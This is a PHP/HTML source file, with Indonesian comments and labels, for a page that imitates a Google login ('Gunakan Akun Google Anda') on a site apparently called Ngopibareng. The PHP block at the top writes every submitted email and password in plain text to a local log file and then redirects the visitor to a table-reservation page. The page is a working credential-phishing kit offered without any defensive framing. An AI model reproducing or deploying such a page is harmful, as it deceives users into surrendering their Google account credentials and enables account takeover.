<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Tangkap data formulir
    $formData = $_POST;

    // Simpan data ke dalam file log
    $logFile = 'form-log.txt';
    file_put_contents($logFile, json_encode($formData) . PHP_EOL, FILE_APPEND);

    // Redirect ke Google setelah formulir berhasil terkirim
    header('Location: ' . BASE_URL . 'resevation/?table=33');
    exit;  // Pastikan keluar dari skrip setelah melakukan redirect
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="assets/img/favicon.png" type="image/x-icon" />
    <title>Google Ngopibareng Autentification | Ngopibareng</title>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&display=swap');

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        .box {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            user-select: none;
        }

        .form {
            width: 400px;
            min-height: 400px;
            padding: 32px;
            border-radius: 6px;
            box-shadow: rgba(0, 0, 0, 0.12) 0px 1px 3px, rgba(0, 0, 0, 0.24) 0px 1px 2px;
        }

        .form img {
            display: block;
            margin: auto;
        }

        .form-title {
            font-weight: 500;
            margin-top: 20px;
            text-align: center;
            font-size: 20px;
        }

        .info {
            text-align: center;
            margin-bottom: 30px;
        }

        .form-group {
            height: 48px;
            margin-bottom: 20px;
            position: relative;
        }

        .form-control {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: none;
            border: 1px solid #a1a1a1;
            outline: none;
            padding: 16px;
            border-radius: 3px;
            z-index: 1;
        }


        .form-label {
            position: absolute;
            left: 13px;
            top: 13px;
            color: #a1a1a1;
            background-color: white;
            padding: 0 6px;
            font-size: 14px;
            transition: .3s;
        }

        .form-control:focus+.form-label {
            top: -10px;
            z-index: 10;
            color: #1B66C9;
            font-weight: 500;
        }

        .form-control:focus {
            border: 1px solid #1B66C9;
        }

        .form-control:not(:focus):valid+label {
            top: -10px;
            z-index: 10;
        }

        .showLabel {
            font-size: 14px;
        }

        .bottom-box {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 35px;
        }

        .bottom-box a {
            color: #1B66C9;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .form-button {
            display: block;
            padding: 12px 32px;
            border: none;
            background-color: #1B66C9;
            color: #fff;
            border-radius: 3px;
            cursor: pointer;
            transition: .3s;
        }

        .form-button:hover {
            box-shadow: 0 10px 36px rgba(0, 0, 0, .15);
        }
    </style>
</head>

<body>
    <div class="box">
        <form action="" class="form" method="post">
            <img src="assets/img/google-text.png" alt="" width="95">
            <h1 class="form-title">Login</h1>
            <p class="info">Gunakan Akun Google Anda</p>

            <div class="form-group">
                <input type="text" name="email" class="form-control" required>
                <label for="" class="form-label">Email atau Nomor Telepon</label>
            </div>

            <div class="form-group">
                <input type="password" name="password" class="form-control" required id="txtPassword">
                <label for="" class="form-label">Masukkan Sandi Anda</label>
            </div>

            <div class="form-group">
                <label class="showLabel">
                    <input type="checkbox" id="show">
                    Tampilkan Sandi
                </label>
            </div>

            <div class="bottom-box">
                <a href="https://www.google.com">Forget password ?</a>
                <button class="form-button" type="submit"> Next</button>
            </div>

        </form>
    </div>
    <script src="assets/js/script.js"></script>
</body>

</html>